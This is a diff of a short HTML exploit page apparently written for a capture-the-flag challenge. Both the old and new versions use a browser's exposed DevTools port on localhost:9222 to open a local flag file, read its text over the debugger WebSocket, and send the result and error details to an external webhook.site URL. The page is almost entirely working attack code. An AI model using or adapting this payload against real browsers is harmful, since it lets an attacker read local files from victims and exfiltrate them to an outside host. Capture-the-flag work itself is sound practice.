@@ -1,51 +1,43 @@
-
 <!doctype html>
-<html>
-<body>
+<meta charset="utf-8">
+<title>CTF test</title>
 <script>
-const collector = "https://webhook.site/2282d57b-95b2-4244-bd6c-118059bc5963";
-
-function report(stage, detail = "") {
-  const url = collector + "?stage=" + encodeURIComponent(stage)
-    + "&detail=" + encodeURIComponent(String(detail));
-  new Image().src = url;
-}
-
 (async () => {
-  report("payload-loaded");
+  const hook = "https://webhook.site/2282d57b-95b2-4244-bd6c-118059bc5963";
+  const report = async (data) => {
+    await fetch(hook, {
+      method: "POST",
+      mode: "no-cors",
+      body: String(data)
+    });
+  };
 
   try {
+    const path = "/challenge/flag-53035d3cba0664dfac37ff64b6e0f86e";
     const response = await fetch(
-      "http://localhost:9222/json/new?file:///challenge/flag-53035d3cba0664dfac37ff64b6e0f86e",
+      "http://localhost:9222/json/new?file://" + path,
       { method: "PUT" }
     );
+    const tab = await response.json();
+    await report("DevTools tab: " + JSON.stringify(tab));
 
-    const target = await response.json();
-    report("devtools-response", JSON.stringify(target));
-
-    const ws = new WebSocket(target.webSocketDebuggerUrl);
-
-    ws.onerror = () => report("websocket-error");
+    const ws = new WebSocket(tab.webSocketDebuggerUrl);
 
     ws.onopen = () => {
       ws.send(JSON.stringify({
         id: 1,
         method: "Runtime.evaluate",
-        params: {
-          expression: "document.body.innerHTML",
-          returnByValue: true
-        }
+        params: { expression: "document.body.innerText" }
       }));
     };
 
-    ws.onmessage = event => {
-      report("devtools-result", event.data);
-      ws.close();
+    ws.onmessage = async (event) => {
+      await report("DevTools result: " + event.data);
     };
+
+    ws.onerror = () => report("WebSocket error");
   } catch (error) {
-    report("exception", error.stack || error.message || error);
+    await report("Error: " + error.message);
   }
 })();
 </script>
-</body>
-</html>
